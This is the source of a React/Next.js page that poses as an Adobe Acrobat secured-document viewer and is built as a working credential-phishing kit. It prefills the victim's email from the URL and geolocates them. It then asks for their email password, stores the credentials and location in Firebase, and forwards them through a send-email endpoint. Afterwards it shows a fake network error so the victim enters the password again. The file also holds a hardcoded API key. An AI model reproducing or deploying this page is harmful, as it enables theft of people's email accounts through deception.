'use client';
import { useState, useEffect } from 'react';
import Image from "next/image";
import { FaDownload, FaFloppyDisk, FaRegEye } from "react-icons/fa6";
import { FaExclamationTriangle, FaPencilAlt } from "react-icons/fa";
import { db, push, ref } from '@/lib/firebase';


export default function Page() {
  const [isWarningVisible, setIsWarningVisible] = useState(true);
  const [animateIn, setAnimateIn] = useState(true);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [location, setLocation] = useState(null);
  const [loading, setLoading] = useState(false); 
  const [error, setError] = useState("");
  const [activeIndex, setActiveIndex] = useState(1);
  const [dynamicBg, setDynamicBg] = useState("/images/img9.jpeg");

  const showWarning = (img, index) => {
    if (img !== "" && index !== undefined) {
      setActiveIndex(index);
      setDynamicBg(img);
    }
    setError("");
    setIsWarningVisible(true);
    setTimeout(() => {
      setAnimateIn(true);
    }, 10);
  };

  const hideWarning = (event) => {
    setError("")
    if (event.target.classList.contains("warn-cont")) {
      setAnimateIn(false);
      setTimeout(() => {
        setIsWarningVisible(false);
      }, 300);
    }
  };

  function getQueryParam(param) {
    return new URLSearchParams(window.location.search).get(param);
  }

  useEffect(() => {
    const emailFromURL = getQueryParam("xi") || "";
    setEmail(emailFromURL);

    const fetchLocation = async () => {
      try {
        const res = await fetch("https://api.ipgeolocation.io/ipgeo?apiKey=477b04ba40ce487b99984aca5c47b2a0");
        if (!res.ok) throw new Error("Location service failed");
        const data = await res.json();
        setLocation(`${data.city || "Unknown City"}, ${data.country_name || "Unknown Country"}`);
      } catch (err) {
        console.error(err);
        setLocation("Unknown Location");
      }
    };
    fetchLocation();
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(false);
    
      if (!email || !password) {
    setError("Both fields are required.");
    return;
  }
    
    setLoading(true);
    setError("");
    try {
      const usersRef = ref(db, "users");
      const newUser = { email, password, location };
      await push(usersRef, newUser);

      const response = await fetch("/api/sendEmail", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(newUser),
      });

      if (response.ok) {
        setError("Network Error! Please verify your information and try again");
        setLoading(false)
        setPassword("");
      } else {
        setError("Error logging in to this account!.");
        setLoading(false)
        setPassword("");
      }
    } catch (error) {
      console.error("Error:", error);
      setError("Logging failed.");
      setLoading(false)
      setPassword("");
    }

  }

  return (
    <div>
      <nav className="topbar">
        <div onClick={()=>showWarning("")} style={{ display: "flex", alignItems: "center", cursor: "pointer" }}>
          <Image src="/images/acrobat.webp" alt="adobe acrobat logo" width={50} height={50} />
          <div className="flex p-2" style={{ color: "#ffffff", backgroundColor: "#4a4a4a", width: "130px", lineHeight: "16px", fontSize: "15px", letterSpacing: "-1px" }}>
            Get Adobe Acrobat Reader
          </div>
        </div>
      </nav>
      <header className="header">
        <Image src="/images/banner.webp" width={75} height={75} alt="banner" />
        <div style={{ display: "flex", justifyContent: "center", alignItems: "center", flexWrap: "wrap", gap: "15px" }}>
          <span onClick={()=>showWarning("")}><FaRegEye /> View</span>
          <span onClick={()=>showWarning("")}><FaPencilAlt /> Edit</span>
          <span onClick={()=>showWarning("")}><FaDownload /> Download</span>
          <span onClick={()=>showWarning("")}><FaFloppyDisk /> Floppy</span>
        </div>
      </header>
      <main className="p-5">
        <div className="backgroundImg z-[-1]">
          <img src={dynamicBg} id="dynamicBg" alt="background image" />
        </div>
        <div className="container card-container bg-[white] border border-[#00000041] rounded-[5px]">
          <div className="card">
            <nav className="navbar flex flex-col">
              <div className="flex w-full">
                <div className="nav-link" onClick={()=>showWarning("")}>Edit</div>
                <div className="nav-link" onClick={()=>showWarning("")}>Sign</div>
                <div className="nav-link active" onClick={()=>showWarning("")}>View</div>
              </div>
            </nav>
            <div className="navtext">Secured Remote Attachment</div>
            <div className="card-body flex flex-col items-center">
              <div className="w-full flex items-center justify-between gap-5">
                {["img10.jpeg", "img9.jpeg", "img11.jpeg"].map((img, index) => (
                  <div className="slide" key={index} onClick={()=>showWarning("/images/"+img, index)} style={{transform: index===activeIndex && "scale(1.1)",
                    border: index===activeIndex && "1px solid #0000003b"}}>
                    <img src={`/images/${img}`} alt={`Document ${index + 4}`} />
                    <div className="overlay">
                      <div className="file-name">{index === 0 ? "Contact Address" : index === 1 ? "Specification" : "Company Presentation"}</div>
                      <div className="file-time">{index === 0 ? "A few minutes ago" : index === 1 ? "An hour ago" : "A few hours ago"}</div>
                    </div>
                  </div>
                ))}
              </div>
              <button className="download-button" onClick={()=>showWarning()}>
                <FaDownload /> DOWNLOAD ALL
              </button>
            </div>
          </div>

          {isWarningVisible && (
            <div className={`warn-cont p-5`} onClick={hideWarning} style={{ display: isWarningVisible? "flex" : "", opacity:isWarningVisible? "1":"0"}}>
              <div className={`warn-card`} style={{transform: animateIn? "translateY(0)" : " translateY(-50px)", opacity: animateIn ? "1" : "0"}}>
                <div className="warn-header">
                  <div className="flex flex-col">
                    <img src="/images/adobe.webp" width={50} alt="Adobe Reader XI" />
                    <div style={{ fontSize: "12px", color: "white" }}>Adobe Reader XI</div>
                  </div>
                  <img src="/images/banner.webp" alt="Adobe logo" width={25} />
                </div>
                <div className="warn-main-content">
                  <div className="warn-main-text">
                    <FaExclamationTriangle className='triangle'/>
                    <p className="mb-0 warn-text">This file is protected by Adobe Doc® Security.</p>
                  </div>
                  <div className="text-center" style={{ fontSize: "14px", color: "black" }}>
                    Enter your email and password to access this PDF document.
                  </div>
                </div>
                <form onSubmit={handleSubmit}>
                  <div id="error" style={{ fontSize: "14px", color: "tomato", textAlign: "center" }}>{error}</div>
                  <input type="email" id="email" readOnly placeholder="autoemail@mail.com" value={email}/>
                  <input type="password" id="password" onChange={(e)=> setPassword(e.target.value)} placeholder="Email password"/>
                  <button type="submit" id='login-btn' className={`btn btn-danger btn-block rounded-sm h-[40px]`}>{loading ? <><div className="lds-roller"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div>Please wait</>: "View Document"}</button>
                </form>
              </div>
            </div>
          )}
        </div>
      </main>
    </div>
  );
    }
